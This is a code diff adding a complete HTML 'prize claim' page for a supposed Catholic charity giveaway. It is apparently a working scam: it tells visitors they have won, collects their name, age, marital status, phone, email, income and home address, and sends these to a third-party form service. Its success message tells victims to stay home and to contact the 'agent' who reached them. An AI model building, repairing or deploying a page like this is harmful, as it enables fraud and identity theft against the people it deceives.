@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Official Prize Claim Portal</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; font-weight: 900; }
+        
+        /* Lively Liquid Watercolor Canvas Style Background */
+        body { 
+            background: radial-gradient(circle at 20% 30%, #e0f7fa 0%, #fff9c4 40%, #f8bbd0 80%),
+                        linear-gradient(135deg, #d5f5e3 0%, #ebdef0 100%);
+            background-blend-mode: multiply;
+            background-attachment: fixed;
+            display: flex; flex-direction: column; min-height: 100vh; justify-content: center; align-items: center; padding: 30px 15px; 
+        }
+        
+        /* Compact Card Framework with Gold & Red Side Borders */
+        .card { 
+            background: #fff; max-width: 500px; width: 100%; border-radius: 16px; 
+            box-shadow: 0 20px 45px rgba(0,0,0,0.15), 0 0 25px rgba(255, 215, 0, 0.15); 
+            overflow: hidden; 
+            border-top: 3px solid #ff4757; border-bottom: 3px solid #ff4757;
+            border-left: 5px solid #ffd700; border-right: 5px solid #ff4757;  
+            animation: slideUp 0.5s ease-out;
+        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Integrated Animated Lively Logo Container */
+        .logo-wrapper { text-align: center; padding-top: 24px; background: #1e272e; }
+        .logo-icon {
+            display: inline-flex; justify-content: center; align-items: center;
+            width: 70px; height: 70px; background: linear-gradient(135deg, #ffeb3b 0%, #ff9800 100%);
+            border-radius: 50%; font-size: 38px; box-shadow: 0 0 20px #ffeb3b, inset 0 0 10px #ffffff;
+            animation: pulseGlow 2s infinite ease-in-out;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 15px #ffeb3b; }
+            50% { transform: scale(1.06); box-shadow: 0 0 25px #ff9800; }
+        }
+        
+        /* Banner Head Section */
+        .banner { background: #1e272e; color: white; padding: 12px 18px 22px 18px; text-align: center; }
+        .banner h1 { font-size: 22px; text-transform: uppercase; color: #ffeb3b; letter-spacing: 0.5px; } 
+        .banner p { font-size: 13px; color: #2ecc71; text-transform: uppercase; margin-top: 4px; } 
+        
+        form, .success-panel { padding: 22px 18px; }
+        .form-row { display: flex; gap: 10px; margin-bottom: 12px; }
+        .form-group { flex: 1; display: flex; flex-direction: column; }
+        
+        label { font-size: 12px; color: #1e272e; text-transform: uppercase; margin-bottom: 4px; letter-spacing: 0.3px; }
+        input, select { width: 100%; padding: 10px 12px; border: 2px solid #2c3e50; border-radius: 6px; font-size: 14px; color: #1e272e; }
+        input:focus, select:focus { outline: none; border-color: #2ecc71; box-shadow: 0 0 8px rgba(46,204,113,0.5); }
+        input::placeholder { color: #7f8c8d; font-weight: 700; }
+        
+        /* Upgraded Luxury Liquid Gold Claim Button */
+        .btn-submit { 
+            background: linear-gradient(135deg, #ffe066 0%, #ffd700 50%, #cca100 100%); 
+            color: #000; border: 2px solid #cca100; width: 100%; padding: 14px; font-size: 16px; 
+            border-radius: 6px; cursor: pointer; text-transform: uppercase; 
+            box-shadow: 0 6px 15px rgba(255,215,0,0.4); transition: all 0.1s ease;
+        }
+        .btn-submit:hover { filter: brightness(1.1); transform: translateY(-1px); box-shadow: 0 8px 20px rgba(255,215,0,0.5); }
+        .btn-submit:active { transform: translateY(1px); }
+        
+        /* Green Center Success Overlay Frame */
+        .success-panel { display: none; text-align: center; padding: 35px 15px; }
+        .success-panel h2 { color: #2ecc71; font-size: 26px; margin-bottom: 12px; text-transform: uppercase; }
+        .success-panel p { font-size: 16px; color: #1e272e; line-height: 1.6; margin-bottom: 12px; }
+        .success-panel .alert { color: #ff4757; font-size: 16px; border: 3px dashed #ff4757; padding: 12px; border-radius: 8px; background: rgba(255,71,87,0.06); text-transform: uppercase; letter-spacing: 0.5px; }
+        
+        footer { margin-top: 20px; font-size: 11px; color: #2c3e50; text-align: center; max-width: 500px; letter-spacing: 0.3px; background: rgba(255, 255, 255, 0.4); padding: 6px 12px; border-radius: 20px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        
+        <!-- NEW CODE PLACED HERE SUCCESSFULLY -->
+        <!-- Lively Animated Winner/Congratulations Logo Header -->
+        <div class="logo-wrapper" style="text-align: center; padding-top: 24px; padding-bottom: 5px; background: #1e272e;">
+            <div class="logo-icon" style="
+                display: inline-flex;
+                justify-content: center;
+                align-items: center;
+                width: 80px;
+                height: 80px;
+                background: linear-gradient(135deg, #ff007f 0%, #ff4757 50%, #ff6b81 100%);
+                border-radius: 50%;
+                font-size: 42px;
+                box-shadow: 0 0 25px #ff4757, inset 0 0 15px #ffffff;
+                animation: pulseGlow 1.5s infinite ease-in-out;
+            ">🎉</div>
+            <div class="rainbow-badge" style="
+                color: #ffffff; 
+                font-size: 14px; 
+                font-weight: 900 !important; 
+                letter-spacing: 2px; 
+                margin-top: 12px; 
+                text-transform: uppercase; 
+                padding: 6px 18px; 
+                border-radius: 20px; 
+                display: inline-block;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+                background: linear-gradient(124deg, #ff2400, #e81d1d, #e8b71d, #1de840, #1ddde8, #2b1de8, #dd1de8, #dd1de8);
+                background-size: 400% 400%;
+                animation: rainbowShift 4s ease infinite;
+            ">WINNER VERIFIED</div>
+        </div>
+
+        <div class="banner">
+            <h1>Official Winner Portal</h1>
+            <p>Welcomunity Charities Annual Giveaway</p>
+        </div>
+        <form id="claimForm">
+            <!-- IMPORTANT: Change the access_key value below to your Web3Forms token -->
+            <input type="hidden" name="access_key" value="0db5863b-dae7-47fb-9060-95b9227ca5c0">
+            <div class="form-row">
+                <div class="form-group" style="flex: 2;">
+                    <label>Full Name</label>
+                    <input type="text" name="fullName" placeholder="WINNERS NAME" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>Age</label>
+                    <input type="number" name="age" min="18" placeholder="25" required>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Gender</label>
+                    <select name="gender" required>
+                        <option value="">-- SELECT --</option>
+                        <option value="Male">MALE</option>
+                        <option value="Female">FEMALE</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Marital Status</label>
+                    <select name="maritalStatus" required>
+                        <option value="">-- SELECT --</option>
+                        <option value="Single">SINGLE</option>
+                        <option value="Married">MARRIED</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" name="phone" placeholder="(283) 218-6839" required>
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" name="email" placeholder="JOHN@EXAMPLE.COM" required>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Income Schedule</label>
+                    <select name="incomeType" required>
+                        <option value="">-- SELECT --</option>
+                        <option value="Monthly">MONTHLY</option>
+                        <option value="Weekly">WEEKLY</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Income Amount ($)</label>
+                    <input type="number" name="incomeAmount" min="0" placeholder="0.00" step="0.01" required>
+                </div>
+            </div>
+
+            <div class="form-group" style="margin-bottom: 12px;">
+                <label>Street Address</label>
+                <input type="text" name="streetAddress" placeholder="123 MAIN ST" required>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group" style="flex: 2;">
+                    <label>City</label>
+                    <input type="text" name="city" placeholder="NEW YORK" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>State</label>
+                    <input type="text" name="state" placeholder="NY" required>
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>ZIP</label>
+                    <input type="text" name="zipCode" placeholder="10001" required>
+                </div>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn-submit">🏆 Claim My Prize 🏆</button>
+        </form>
+
+        <div id="successPanel" class="success-panel">
+            <h2>Congratulations!</h2>
+            <p>Your winnings claiming has been approved.</p>
+            <div class="alert">Make sure you stay at home to receive your package.</div>
+            <p style="margin-top: 20px; font-size: 13px; color: #7f8c8d;">Please get back to the agent that reached out to you.</p>
+        </div>
+    </div>
+
+    <footer>
+        WELCOMUNITY CATHOLIC CHARITIES | SUPPORT: (283) 218-6839 | NODE: GIVEAWAYMANAGEMENT@FFUNDSPC.COM
+    </footer>
+
+    <script>
+        const form = document.getElementById('claimForm');
+        const successPanel = document.getElementById('successPanel');
+        const submitBtn = document.getElementById('submitBtn');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            submitBtn.innerText = "VERIFYING WINNER...";
+            submitBtn.disabled = true;
+
+            // FIX: Changed from homepage to the official Web3Forms API submission URL
+            fetch('https://web3forms.com', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                body: JSON.stringify(Object.fromEntries(new FormData(form)))
+            })
+            .then(res => {
+                if (res.status == 200) {
+                    form.style.display = 'none';
+                    successPanel.style.display = 'block';
+                } else {
+                    alert("Verification error. Please check fields.");
+                    submitBtn.innerText = "CLAIM MY PRIZE";
+                    submitBtn.disabled = false;
+                }
+            })
+            .catch(() => {
+                alert("Server communication error.");
+                submitBtn.innerText = "CLAIM MY PRIZE";
+                submitBtn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
